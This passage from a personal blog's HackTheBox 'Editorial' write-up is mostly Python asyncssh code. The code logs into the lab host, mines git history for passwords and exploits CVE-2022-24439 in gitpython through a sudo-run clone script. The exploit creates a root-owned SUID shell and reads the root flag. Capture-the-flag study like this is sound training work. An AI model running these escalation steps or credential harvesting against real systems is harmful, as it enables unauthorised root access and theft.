+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Username: </span><span class="z-10">{</span><span class="z-2">username</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Password: </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span> username</span><span class="z-3"> is None or</span><span> password</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Failed to extract username and password.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>credentials</span><span class="z-3"> = {</span><span>username</span><span class="z-3">:</span><span> password</span><span class="z-3">}</span></span></code></pre><h2 id="shell-as-dev"><a class="zola-anchor" href="#shell-as-dev" aria-label="Link to this section">#</a>
+Shell as <code>dev</code></h2>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">dev</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;dev&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">dev</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-6">editorial.htb</span><span class="z-3">&quot;,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check user</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Obtain the flag</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">cat user.txt</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3"> is not None:</span></span>
+<span class="giallo-l"><span>        dev_flag</span><span class="z-3"> =</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Dev flag: </span><span class="z-10">{</span><span class="z-2">dev_flag</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check commit history within `/home/dev/apps` directory</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &#39;</span><span class="z-6">cd /home/dev/apps &amp;&amp; git --no-pager log -p -G &quot;Username: .*Password: .*&quot;</span><span class="z-3">&#39;,</span></span>
+<span class="giallo-l"><span class=" z-i">        check</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Failed to retrieve commit history.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    commit_history</span><span class="z-3"> =</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">commit_history</span><span class="z-3">,</span><span class="z-12"> bytes</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span>        commit_history</span><span class="z-3"> =</span><span> commit_history</span><span class="z-3">.</span><span class="z-2">decode</span><span class="z-3">(&quot;</span><span class="z-6">utf-8</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    assert</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">commit_history</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    for</span><span> match</span><span class="z-3 z-i"> in</span><span> USERNAME_PASSWORD_PATTERN</span><span class="z-3">.</span><span class="z-2">finditer</span><span class="z-3">(</span><span class="z-2">commit_history</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span>        username</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">username</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        password</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">password</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> username</span><span class="z-3"> in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            if</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">] ==</span><span> password</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                continue</span><span class="z-1 z-i">  # Skip already known credentials</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            else</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">                    f</span><span class="z-6">&quot;Found different credentials for </span><span class="z-10">{</span><span class="z-2">username</span><span class="z-10">}</span><span class="z-6">: </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">                )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        else</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>            credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">] =</span><span> password</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">                f</span><span class="z-6">&quot;Username: </span><span class="z-10">{</span><span class="z-2">match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&#39;</span><span class="z-6">username</span><span class="z-3">&#39;)</span><span class="z-10">}</span><span class="z-6">, Password: </span><span class="z-10">{</span><span class="z-2">match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&#39;</span><span class="z-6">password</span><span class="z-3">&#39;)</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">            )</span></span></code></pre><h2 id="shell-as-prod"><a class="zola-anchor" href="#shell-as-prod" aria-label="Link to this section">#</a>
+Shell as <code>prod</code></h2>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">prod</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;prod&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">prod</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-6">editorial.htb</span><span class="z-3">&quot;,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check user</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check privilege</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;echo </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6"> | sudo -S -l&quot;</span><span class="z-3">,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span></code></pre><h2 id="shell-as-root"><a class="zola-anchor" href="#shell-as-root" aria-label="Link to this section">#</a>
+Shell as <code>root</code></h2>
+<p>Exploit <code>CVE-2022-24439</code> to get <code>root</code> access</p>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">prod</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;prod&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">prod</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>ROOT_SHELL_PATH</span><span class="z-3"> = &quot;</span><span class="z-6">/home/prod/root_sh</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>EXPLOIT_SCRIPT</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;&quot;&quot;</span></span>
+<span class="giallo-l"><span class="z-6">#!/bin/bash</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-6">cp /bin/sh </span><span class="z-10">{</span><span>ROOT_SHELL_PATH</span><span class="z-10">}</span></span>
+<span class="giallo-l"><span class="z-6">chown root:root </span><span class="z-10">{</span><span>ROOT_SHELL_PATH</span><span class="z-10">}</span></span>
+<span class="giallo-l"><span class="z-6">chmod 6777 </span><span class="z-10">{</span><span>ROOT_SHELL_PATH</span><span class="z-10">}</span></span>
+<span class="giallo-l"><span class="z-6">&quot;&quot;&quot;</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>EXPLOIT_SCRIPT_PATH</span><span class="z-3"> = &quot;</span><span class="z-6">/home/prod/exploit.sh</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-6">editorial.htb</span><span class="z-3">&quot;,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check user</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Create the exploit script</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">        f</span><span class="z-6">&quot;echo &#39;</span><span class="z-10">{</span><span class="z-2">EXPLOIT_SCRIPT</span><span class="z-10">}</span><span class="z-6">&#39; &gt; </span><span class="z-10">{</span><span class="z-2">EXPLOIT_SCRIPT_PATH</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">,</span><span class=" z-i"> check</span><span class="z-3">=True</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Make the exploit script executable</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;chmod +x </span><span class="z-10">{</span><span class="z-2">EXPLOIT_SCRIPT_PATH</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Execute the exploit</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">        f</span><span class="z-6">&quot;echo </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6"> | sudo -S /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#39;ext::sh -c </span><span class="z-10">{</span><span class="z-2">EXPLOIT_SCRIPT_PATH</span><span class="z-10">}</span><span class="z-6">&#39;&quot;</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stderr</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Obtain the shell</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">        f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span class="z-2">ROOT_SHELL_PATH</span><span class="z-10">}</span><span class="z-6"> -p -c &#39;id&#39; &amp;&amp; </span><span class="z-10">{</span><span class="z-2">ROOT_SHELL_PATH</span><span class="z-10">}</span><span class="z-6"> -p -c &#39;cat /root/root.txt&#39;&quot;</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">        check</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span></code></pre><h2 id="references"><a class="zola-anchor" href="#references" aria-label="Link to this section">#</a>
+References</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://0xdf.gitlab.io/2024/10/19/htb-editorial.html">HTB: Editorial | 0xdf hacks stuff</a></li>
+<li><a rel="noopener external" target="_blank" href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">Remote Code Execution (RCE) in gitpython | CVE-2022-24439 | Snyk</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/linkvortex/">← Older: LinkVortex</a><a href="https://shengtuo.me/blog/ssh-x11-forwarding/">Newer: X11 Forwarding over SSH →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
